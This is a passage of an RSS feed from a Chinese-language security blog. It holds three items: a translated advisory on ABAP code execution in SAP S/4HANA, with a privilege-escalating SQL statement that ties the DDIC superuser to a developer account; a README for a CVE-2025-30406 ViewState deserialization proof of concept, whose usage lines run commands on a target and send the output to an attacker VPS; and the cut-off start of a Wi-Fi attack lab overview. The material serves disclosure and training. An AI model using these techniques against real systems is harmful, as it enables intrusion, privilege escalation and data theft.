        <link>http://localhost:1313/p/sap-netweaver-s/4hana%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E5%86%85%E9%83%A8%E5%87%BD%E6%95%B0write_and_call_dbprog%E5%AE%9E%E7%8E%B0abap%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
        <pubDate>Mon, 04 Aug 2025 19:22:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sap-netweaver-s/4hana%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E5%86%85%E9%83%A8%E5%87%BD%E6%95%B0write_and_call_dbprog%E5%AE%9E%E7%8E%B0abap%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
        <description>&lt;h1 id=&#34;nullfaktor安全公告-20250719&#34;&gt;nullFaktor安全公告 &amp;lt;20250719&amp;gt;
&lt;/h1&gt;&lt;h2 id=&#34;漏洞标题&#34;&gt;漏洞标题
&lt;/h2&gt;&lt;p&gt;通过内部函数模块WRITE_AND_CALL_DBPROG实现ABAP代码执行&lt;/p&gt;
&lt;h2 id=&#34;产品信息&#34;&gt;产品信息
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;受影响产品：SAP NetWeaver S/4HANA&lt;/li&gt;
&lt;li&gt;主页：http://www.sap.com&lt;/li&gt;
&lt;li&gt;受影响版本：S/4HANA, SAP_BASIS 757 SP 3&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;风险评级&#34;&gt;风险评级
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;影响程度：高&lt;/li&gt;
&lt;li&gt;CVSS 4.0评分：8.4&lt;/li&gt;
&lt;li&gt;CWE编号：
&lt;ul&gt;
&lt;li&gt;CWE-749：暴露危险方法或功能&lt;/li&gt;
&lt;li&gt;CWE-94：代码生成控制不当（代码注入）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情
&lt;/h2&gt;&lt;p&gt;在SAP S/4HANA的安全研究中，我们发现函数组SDB2中的WRITE_AND_CALL_DBPROG模块存在安全风险。该模块允许用户执行原生SQL语句，并通过INSERT REPORT将SQL代码写入报告后动态执行，整个过程缺乏输入验证和权限检查。&lt;/p&gt;
&lt;h3 id=&#34;利用前提&#34;&gt;利用前提
&lt;/h3&gt;&lt;p&gt;攻击者需要具备执行本地函数模块的权限（包含S_DEVELOP授权且ACTVT=16）。虽然SAP声明生产系统不应分配此权限，但实际企业环境中普遍存在权限配置过大的情况。&lt;/p&gt;
&lt;h3 id=&#34;攻击影响&#34;&gt;攻击影响
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;绕过所有权限限制：可任意读写数据库数据&lt;/li&gt;
&lt;li&gt;向SAP命名空间注入自定义代码&lt;/li&gt;
&lt;li&gt;突破系统/客户端的不可修改性锁定&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;日期&lt;/th&gt;
          &lt;th&gt;事件描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;2024-09-06&lt;/td&gt;
          &lt;td&gt;首次联系SAP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2025-02-05&lt;/td&gt;
          &lt;td&gt;双方确认在规范配置下不构成安全风险&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2025-07-10&lt;/td&gt;
          &lt;td&gt;公告发布&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;攻击场景演示&#34;&gt;攻击场景演示
&lt;/h2&gt;&lt;p&gt;通过SE37执行以下操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建名为Z_HACKED的报告&lt;/li&gt;
&lt;li&gt;注入SQL语句：&lt;code&gt;UPDATE USREFUS SET REFUSER = &#39;DDIC&#39; WHERE BNAME = &#39;DEVELOPER&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;成功将超级用户DDIC关联到当前用户&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;sap官方反馈&#34;&gt;SAP官方反馈
&lt;/h2&gt;&lt;p&gt;SAP认为生产系统不应分配S_DEVELOP/ACTVT=16权限，故不视作安全漏洞。建议通过SAP Note 3546011配置详细权限控制。&lt;/p&gt;
&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;检查生产系统用户权限&lt;/li&gt;
&lt;li&gt;禁止SE37与S_DEVELOP/ACTVT=16的组合权限&lt;/li&gt;
&lt;li&gt;非生产系统需细化对象类型权限&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;关于nullFaktor：奥地利网络安全公司，专注SAP安全测试与咨询服务。&lt;br&gt;
官网：https://www.nullfaktor.com&lt;br&gt;
完整技术细节：https://www.nullfaktor.com/blog#Advisory_09-07-25&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Gladinet Centrestack硬编码加密密钥漏洞利用分析(CVE-2025-30406)</title>
        <link>http://localhost:1313/p/gladinet-centrestack%E7%A1%AC%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E5%AF%86%E9%92%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90cve-2025-30406/</link>
        <pubDate>Mon, 04 Aug 2025 19:06:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/gladinet-centrestack%E7%A1%AC%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E5%AF%86%E9%92%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90cve-2025-30406/</guid>
        <description>&lt;h1 id=&#34;cve-2025-30406-viewstate漏洞利用验证&#34;&gt;CVE-2025-30406 ViewState漏洞利用验证
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;这是一个针对ASP.NET应用中&lt;strong&gt;CVE-2025-30406&lt;/strong&gt;的ViewState反序列化漏洞验证脚本(PoC)。该脚本利用ysoserial生成恶意ViewState载荷，向指定URL发送以执行任意命令。建议将命令输出通过自定义HTTP服务器(&lt;code&gt;server.py&lt;/code&gt;)回传至VPS，该服务器会以带时间戳的绿色提示符和白色输出文本的格式化方式展示结果。本脚本仅限&lt;strong&gt;教育用途&lt;/strong&gt;，必须在获得&lt;strong&gt;明确授权&lt;/strong&gt;的系统上使用安全测试。未经授权使用属违法行为。&lt;/p&gt;
&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE编号&lt;/strong&gt;: CVE-2025-30406&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞描述&lt;/strong&gt;: ASP.NET ViewState处理过程中的反序列化漏洞，当验证密钥和生成器已知时可导致远程代码执行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;受影响系统&lt;/strong&gt;: 存在ViewState配置漏洞的ASP.NET应用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用前提&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;获取有效的ViewState验证密钥和生成器&lt;/li&gt;
&lt;li&gt;存在接收ViewState参数的脆弱端点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;仓库内容&#34;&gt;仓库内容
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exploit.py&lt;/code&gt;: 生成和发送ViewState载荷的主脚本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;server.py&lt;/code&gt;: 接收并格式化显示回传命令输出的HTTP服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;环境要求&#34;&gt;环境要求
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Python 3.x&lt;/li&gt;
&lt;li&gt;&lt;code&gt;requests&lt;/code&gt;库(&lt;code&gt;pip install requests&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;ysoserial可执行文件&lt;/li&gt;
&lt;li&gt;存在漏洞的ASP.NET应用端点&lt;/li&gt;
&lt;li&gt;用于运行&lt;code&gt;server.py&lt;/code&gt;的VPS服务器(建议用于数据回传)&lt;/li&gt;
&lt;li&gt;目标系统的测试授权&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;安装步骤&#34;&gt;安装步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;克隆仓库:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/yourusername/cve-2025-30406-poc.git
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; cve-2025-30406-poc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;安装Python依赖:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install requests
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;下载ysoserial并置于&lt;code&gt;exploit.py&lt;/code&gt;同目录:
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/frohoff/ysoserial&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ysoserial GitHub&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;vps配置建议&#34;&gt;VPS配置建议
&lt;/h2&gt;&lt;p&gt;在VPS上运行&lt;code&gt;server.py&lt;/code&gt;接收格式化输出:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;复制脚本到VPS:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp server.py user@your-vps-ip:/home/user/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;确保安装Python3:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt install python3 python3-pip
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;启动服务器(默认8000端口):
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 server.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;开放防火墙端口:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ufw allow &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;记录VPS公网IP(如&lt;code&gt;http://your-vps-ip:8000&lt;/code&gt;)供&lt;code&gt;exploit.py&lt;/code&gt;的&lt;code&gt;-e&lt;/code&gt;参数使用&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
&lt;/h2&gt;&lt;h3 id=&#34;执行漏洞利用&#34;&gt;执行漏洞利用
&lt;/h3&gt;&lt;p&gt;运行&lt;code&gt;exploit.py&lt;/code&gt;时必须指定参数。&lt;code&gt;-e&lt;/code&gt;参数可选但建议用于回传输出:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python exploit.py -u  -c  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-y &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-e &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;参数说明&#34;&gt;参数说明
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-u, --url&lt;/code&gt;: 目标URL(必选)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-c, --command&lt;/code&gt;: 待执行命令(必选)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-y, --ysoserial&lt;/code&gt;: ysoserial路径(默认&lt;code&gt;./ysoserial.exe&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e, --exfil&lt;/code&gt;: 回传服务器URL(如&lt;code&gt;http://your-vps:8000&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;使用示例&#34;&gt;使用示例
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;无回传执行:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python exploit.py -u http://example.com/loginpage.aspx -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;whoami&amp;#34;&lt;/span&gt; -y ./ysoserial.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;带回传执行:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python exploit.py -u http://example.com/loginpage.aspx -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;whoami&amp;#34;&lt;/span&gt; -y ./ysoserial.exe -e http://your-vps:8000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;启动回传服务器&#34;&gt;启动回传服务器
&lt;/h3&gt;&lt;p&gt;在VPS上启动HTTP服务器接收输出:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 server.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;服务器将以带时间戳的绿色提示符格式化显示命令输出。&lt;/p&gt;
&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;漏洞利用脚本&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;使用硬编码验证密钥通过ysoserial生成ViewState载荷&lt;/li&gt;
&lt;li&gt;当指定&lt;code&gt;-e&lt;/code&gt;参数时，通过&lt;code&gt;Invoke-WebRequest&lt;/code&gt;封装命令输出回传&lt;/li&gt;
&lt;li&gt;通过POST请求向目标URL的&lt;code&gt;__VIEWSTATE&lt;/code&gt;参数提交载荷&lt;/li&gt;
&lt;li&gt;输出服务器响应状态和部分响应体&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP服务器&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;监听包含命令输出的GET请求&lt;/li&gt;
&lt;li&gt;解码URL路径并按行分割&lt;/li&gt;
&lt;li&gt;以带时间戳的绿色提示符格式化输出&lt;/li&gt;
&lt;li&gt;返回HTTP 200响应&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;道德使用声明&#34;&gt;道德使用声明
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本脚本仅限CVE-2025-30406的教育研究和授权测试&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;禁止在未授权系统上使用&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;滥用可能违反《计算机欺诈和滥用法案》(CFAA)等法律&lt;/li&gt;
&lt;li&gt;测试前必须获取书面授权&lt;/li&gt;
&lt;li&gt;请通过协调披露或漏洞赏金计划进行负责任的漏洞报告&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;已知限制&#34;&gt;已知限制
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;硬编码验证密钥可能仅适用于特定应用&lt;/li&gt;
&lt;li&gt;仅针对存在ViewState反序列化漏洞的ASP.NET应用&lt;/li&gt;
&lt;li&gt;需假设目标服务器能正确处理ViewState载荷&lt;/li&gt;
&lt;li&gt;跨平台兼容性依赖ysoserial可用性(主要支持Windows)&lt;/li&gt;
&lt;li&gt;回传功能需要服务器具有公网可达性&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;许可协议&#34;&gt;许可协议
&lt;/h2&gt;&lt;p&gt;本项目采用MIT许可证，详见LICENSE文件。&lt;/p&gt;
&lt;h2 id=&#34;联系方式&#34;&gt;联系方式
&lt;/h2&gt;</description>
        </item>
        <item>
        <title>无需物理硬件的Wi-Fi黑客实战：Wi-Fi Forge虚拟化无线攻防实验室</title>
        <link>http://localhost:1313/p/%E6%97%A0%E9%9C%80%E7%89%A9%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84wi-fi%E9%BB%91%E5%AE%A2%E5%AE%9E%E6%88%98wi-fi-forge%E8%99%9A%E6%8B%9F%E5%8C%96%E6%97%A0%E7%BA%BF%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E5%AE%A4/</link>
        <pubDate>Mon, 04 Aug 2025 18:49:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%97%A0%E9%9C%80%E7%89%A9%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84wi-fi%E9%BB%91%E5%AE%A2%E5%AE%9E%E6%88%98wi-fi-forge%E8%99%9A%E6%8B%9F%E5%8C%96%E6%97%A0%E7%BA%BF%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E5%AE%A4/</guid>
        <description>&lt;h3 id=&#34;核心技术创新&#34;&gt;核心技术创新
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;内核级虚拟化架构&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于&lt;code&gt;mac80211_hwsim&lt;/code&gt;内核模块创建虚拟无线接口&lt;/li&gt;
&lt;li&gt;在用户空间实现AP/客户端行为模拟&lt;/li&gt;
&lt;li&gt;完全绕过物理无线网卡限制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;攻击场景覆盖&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WPA2四步握手捕获&lt;/li&gt;
&lt;li&gt;WPS Pixie Dust攻击&lt;/li&gt;
&lt;li&gt;邪恶双子（Evil Twin）钓鱼AP&lt;/li&gt;
&lt;li&gt;WEP密钥破解（需25000+数据包）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;独特优势&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 示例：Wi-Fi Forge启动命令&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wifi_forge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lab&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wpa2_handshake&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                     &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;channel&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                     &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bssid&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;55&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;实时生成可交互的TMUX多窗格环境&lt;/li&gt;
&lt;li&gt;内置Bettercap/Aircrack-ng等工具链&lt;/li&gt;
